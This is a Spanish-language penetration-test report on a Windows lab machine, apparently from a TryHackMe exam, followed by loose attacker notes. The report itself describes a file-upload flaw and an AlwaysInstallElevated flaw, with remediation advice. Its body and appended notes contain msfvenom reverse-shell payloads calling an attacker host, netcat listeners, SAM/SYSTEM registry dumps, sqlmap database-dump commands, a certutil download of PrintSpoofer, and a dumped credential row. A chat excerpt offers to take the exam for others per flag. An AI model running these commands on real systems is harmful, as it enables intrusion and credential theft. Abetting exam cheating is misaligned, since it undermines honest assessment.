Informe de Pruebas de Penetración: Escalada de Privilegios y Acceso Inicial
Resumen del Informe
Resumen Ejecutivo

La prueba de penetración se realizó en un equipo con Windows con el objetivo de evaluar su seguridad e identificar vulnerabilidades que un atacante podría aprovechar para obtener acceso no autorizado. El alcance de la evaluación se centró en probar puntos de entrada al sistema, explorar posibles métodos de escalada de privilegios e identificar cualquier debilidad de seguridad que pudiera conducir a accesos no autorizados o manipulación del sistema.

Durante la prueba, se identificaron vulnerabilidades críticas que permitieron el acceso inicial, seguido de la escalada de privilegios, y finalmente el acceso a nivel de SISTEMA. Estos hallazgos representan riesgos significativos para la organización, incluyendo la posibilidad de que actores maliciosos obtengan el control total de sistemas y datos confidenciales.

Hallazgos Clave:

Carga de Archivos Sin Restricciones: Se detectó que una aplicación en el sistema objetivo permitía la carga de archivos sin restricciones, lo que permitía cargar y ejecutar archivos maliciosos.

Configuración insegura del registro: La opción "AlwaysInstallElevated" del registro de Windows permitía que los archivos MSI se ejecutaran con privilegios elevados, lo que permitía a los atacantes eludir las restricciones de usuario y ejecutar código arbitrario como administrador.

La combinación de estas vulnerabilidades nos permitió obtener acceso inicial al sistema, ejecutar un shell inverso y escalar privilegios a nivel de SISTEMA. Se recomienda actuar de inmediato para remediar estas vulnerabilidades y evitar el acceso no autorizado.

Hallazgos y recomendaciones

Carga de archivos sin restricciones (Aplicación personalizada)

Nivel de riesgo: Alto

Impacto: Los atacantes pueden cargar y ejecutar código arbitrario, lo que podría comprometer el sistema.

Recomendación: Implementar una validación y desinfección de archivos adecuadas en el mecanismo de carga de archivos. Limitar los tipos de archivos permitidos y garantizar que las cargas de los usuarios no puedan ejecutar código arbitrario.

Configuración de Registro Insegura (AlwaysInstallElevated)

Nivel de Riesgo: Crítico

Impacto: Los atacantes pueden crear y ejecutar archivos MSI maliciosos con privilegios elevados, lo que puede comprometer por completo el sistema.

Recomendación: Desactive la opción "AlwaysInstallElevated" en el registro de Windows. Asegúrese de que solo usuarios y procesos de confianza puedan instalar software o ejecutar archivos MSI con privilegios elevados.

Escalada de Privilegios mediante MSI (Configuración de Registro Insegura)

Nivel de Riesgo: Crítico

Impacto: Los atacantes pueden obtener acceso administrativo o de nivel SISTEMA al equipo.

Recomendación: Revise y actualice la configuración del sistema para asegurarse de que la opción "AlwaysInstallElevated" esté deshabilitada y restrinja el acceso a las claves de registro que la rigen.

Permisos de Directorios Mal Configurados

Nivel de Riesgo: Medio

Impacto: Los permisos de archivo inseguros pueden permitir a los atacantes leer, escribir o ejecutar archivos confidenciales.

Recomendación: Auditar periódicamente los permisos de directorios y archivos, especialmente en directorios críticos para el sistema como C:\Archivos de programa y C:\Windows. Asegurarse de que solo los usuarios autorizados tengan permisos de escritura o ejecución.

Descripción de vulnerabilidades
Vulnerabilidad 1: Carga de archivos sin restricciones

Calificación de riesgo: Alta
Valor de la bandera: THM{884a8fcd-7d9d-429c-97c2-a456c304206e}

Descripción:

Se identificó una vulnerabilidad de carga de archivos sin restricciones en una aplicación personalizada alojada en el sistema objetivo (https://10.200.150.151/). La aplicación permite a los usuarios cargar archivos sin validar los tipos de archivo, lo que permite la carga de archivos arbitrarios (incluido código ejecutable). Esto se explota comúnmente para cargar scripts maliciosos, como shells inversos, que pueden ejecutarse en el servidor al acceder a ellos.

La vulnerabilidad se descubrió al cargar una carga útil manipulada (es decir, msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.250.1.6 LPORT=1234 -f exe -o 1234.exe.pdf) y escuchar en una sesión netcat (nc -lvnp 1234).

Impacto:
Un atacante podría cargar un archivo malicioso y ejecutar código arbitrario en el servidor, lo que podría comprometer el sistema y obtener acceso a información confidencial. Si no se detecta, esta vulnerabilidad podría comprometer completamente el sistema.

Recomendaciones de solución:

Implemente una validación y desinfección de entrada adecuadas para los archivos cargados. Permita únicamente tipos de archivo conocidos y seguros (por ejemplo, imágenes o PDF).

Utilice una lista blanca de tipos de archivo y realice comprobaciones del lado del servidor para garantizar que los archivos cargados no sean ejecutables.

Asegúrese de que los archivos cargados se almacenen en directorios no ejecutables para evitar su ejecución automática.

Vulnerabilidad 2: Configuración de registro insegura (AlwaysInstallElevated)

Calificación de riesgo: Crítico
Valor de la bandera: THM{6e9a8f94-7e2a-4aa0-adb9-1eaa3e687749}

Descripción:

Se detectó que la configuración de registro AlwaysInstallElevated en Windows estaba habilitada tanto en el registro HKCU (Usuario actual) como en el HKLM (Máquina local). Esto permite que los archivos de instalación MSI se ejecuten con privilegios elevados, independientemente del usuario que los ejecute. Esta configuración incorrecta podría permitir a atacantes con acceso de bajo nivel crear archivos MSI maliciosos y ejecutarlos con privilegios de sistema.

La vulnerabilidad se identificó consultando los valores de registro con el comando reg query, lo que confirmó que la configuración AlwaysInstallElevated estaba establecida en 1 en ambas ubicaciones.

Impacto:

Un atacante podría explotar esta vulnerabilidad creando un archivo MSI malicioso (p. ej., msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.250.1.6 LPORT=8888 -f msi -o shell.msi) y ejecutándolo para escalar privilegios y obtener acceso a nivel de SISTEMA.

Recomendación de solución:

Desactive la opción AlwaysInstallElevated estableciendo el valor a 0 en HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer y HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer.

Audite periódicamente la configuración del registro y asegúrese de que no haya ninguna configuración insegura habilitada.

Restringa el acceso a la configuración del registro a usuarios no administradores para evitar su manipulación.

Vulnerabilidad 3: Escalada de privilegios mediante un archivo MSI malicioso

Calificación de riesgo: Crítico

Descripción:

Tras confirmar la presencia de la configuración de registro AlwaysInstallElevated, pudimos crear un archivo MSI malicioso mediante msfvenom para iniciar un shell inverso con privilegios de SISTEMA. El shell inverso se ejecutó correctamente tras ejecutar el archivo MSI en el equipo objetivo mediante el comando msiexec (msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi).

Impacto:

Esta vulnerabilidad permite a un atacante eludir las restricciones de usuario y ejecutar código arbitrario con privilegios elevados, lo que permite el acceso a nivel de SISTEMA. Esto podría utilizarse para exfiltrar datos confidenciales, implementar malware o comprometer aún más el sistema.

Consejos de solución:

Desactive la configuración de registro AlwaysInstallElevated como se describe en la vulnerabilidad 2.

Implemente un control de acceso con privilegios mínimos para los usuarios, garantizando que solo los administradores de confianza puedan ejecutar archivos MSI con privilegios elevados.

Audite y supervise periódicamente la ejecución de archivos MSI, especialmente en entornos de producción.

Vulnerabilidad 4: Permisos mal configurados en directorios

Calificación de riesgo: Media

Descripción:

Se encontraron permisos de archivos y directorios mal configurados en varios directorios críticos, incluyendo C:\Users\hr\Documents. Atacantes o usuarios no autorizados podrían haber accedido a archivos confidenciales, como user.txt (el indicador de privilegios bajos).

Impacto:

Los permisos incorrectos podrían permitir a los atacantes leer, modificar o eliminar archivos confidenciales, lo que podría exponer las credenciales de usuario o datos confidenciales. Esto podría facilitar los ataques de escalada de privilegios o el robo de datos.

Consejos de remediación:

Implemente el principio de mínimo privilegio restringiendo el acceso a directorios y archivos sensibles.

Asegúrese de que solo los usuarios y administradores autorizados tengan acceso a los archivos y directorios críticos.

Audite periódicamente los permisos de directorios y archivos para garantizar que estén configurados correctamente.

Conclusión

Esta prueba de penetración reveló vulnerabilidades críticas que expusieron el sistema a accesos no autorizados y escalada de privilegios. Es necesario remediar de inmediato los problemas identificados, en particular la configuración incorrecta del registro AlwaysInstallElevated y la vulnerabilidad de carga de archivos sin restricciones, para mitigar el riesgo de explotación. Al abordar estas vulnerabilidades, la organización puede mejorar significativamente su seguridad y reducir la probabilidad de un ataque exitoso.






-------------------------------------------------------------------------------------------------------------------








-------------------------------------------------------------------------------------------------------------------

reg save hklm\\SYSTEM C:\\Users\\john\\Documents\\system.bak
reg save hklm\\SAM C:\\Users\\john\\Documents\\sam.bak





sqlmap -u "http://10.200.150.100:8080/api/v1.0/auth" --data='{"username":"admin","password":"admin"}' --headers="Content-Type: application/json" --method=POST --ignore-code=401 -D trybankmedbs --tables --dump

curl -H 'Content-Type: application/json' -X POST -d '{"Username" , "target51" , "pass" , "1234567890"}' http://10.200.150.100:8080/api/v1.0/xss
{"message":"Server error: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand."}


Database: sequel
Table: user
[1 entry]
+----+------------------+---------------------+------------------------------------------+
| id | email            | created             | password                                 |
+----+------------------+---------------------+------------------------------------------+
| 1  | admin@sequel.thm | 2025-02-21 09:05:46 | zxQY7tN1iUz9EJ3l8zWezxQY7tN1iUz9EJ3l8zWe |
+----+------------------+---------------------+---------------------





sqlmap -u "http://10.200.150.100:8080/api/v1.0/auth" --data='{"username":"super","password":"Super@123"}' -H "Content-Type: application/json" --method=POST --ignore-code=401 -D trybankmedbs --tables --dump --batch


sqlmap -u "http://10.200.150.100:8080/api/v1.0/auth" --data='{"username":"super*","password":"Super@123"}' -H "Content-Type: application/json" --method=POST --dbs --batch



    sqlmap -u "http://10.200.150.100:8080/api/v1.0/auth" --data='{"username":"admin","password":"admin"}' --header="Content-Type:application/json" --method=POST --ignore-code=401 --dump-all





sqlmap -u "http://10.200.150.100:8080/api/v1.0/auth" --data='{"username":"admin","password":"admin"}' --header='Content-Type: application/json' --method=POST --batch -T Flags -D trybankmedbs  --ignore-code=401





sqlmap -u "http://10.200.150.100:8080/api/v1.0/auth" --data='{"username":"admin","password":"admin"}' --header="Content-Type: application/json" --method=POST --ignore-code=401 -D trybankmedbs -T Flags --dump





### Ejemplos
└─$ sqlmap -u "http://127.0.0.1:8000/login1.php?msg=1" --method=POST --data="uid=admin&password=root" --dbms=mysql --batch -D sqlitraining --tables



sqlmap -u "http://127.0.0.1:8000/login1.php?msg=1" --method=POST --data="uid=admin&password=root" --dbms=mysql --batch -D sqlitraining -T users -C username,password --dump


sqlmap -u "http://localhost/computer_parts/register.php" \
--method=POST \
--data="first_name=Test&last_name=User&email=test2@example.com&password=abc123" \
--dbms=mysql --batch \
--output-dir=~/Desktop/sqlmap_project/register


-------------------------------------------------------------------------------------------------------------------------

John Doe, [15/8/2025 4:14]
¿Alguien quiere que le haga el examen? ¡Por favor, envíenme un mensaje directo!
La oferta es para todo el examen y también por bandera.
Para obtener orientación, no duden en contactarme también por mensaje directo.
He aprobado este examen tres veces en diferentes equipos, así que puedo ayudar.

John Doe, [15/8/2025 4:19]
Para la web:
Recomiendo empezar de una forma que no sea demasiado compleja; de lo contrario, se cansará fácilmente.
Primero, cree una cuenta y capture todos sus datos.

Como el número de cuenta, el número de tarjeta, el número de transacción, el número de bóveda, el número de préstamo, etc.

Pruebe XSS, SQLi, cambie el rol, cambie el importe de la transacción a -ve o 0.5, suba archivos a la bóveda y algunas cosas más. Luego, cree otra cuenta de usuario e intente acceder a todos los datos de las otras cuentas, como los errores de IDOR. Esto debería generar al menos dos o tres indicadores.

John Doe, [15/8/2025 4:24]
Durante la actualización del rol, asegúrese de realizar una solicitud PUT en lugar de POST o GET.









root@kali :~#, [15/8/2025 9:26]
i tried to create multiple account , send repeater multiple request (group)

root@kali :~#, [15/8/2025 9:26]
IT WORKED







-------------------------------------------------------------------------


mkdir C:\Tools



certutil -urlcache -f http://10.250.1.6:8000/PrintSpoofer64.exe C:\Windows\Temp\PrintSpoofer64.exe








login1.php?msg=1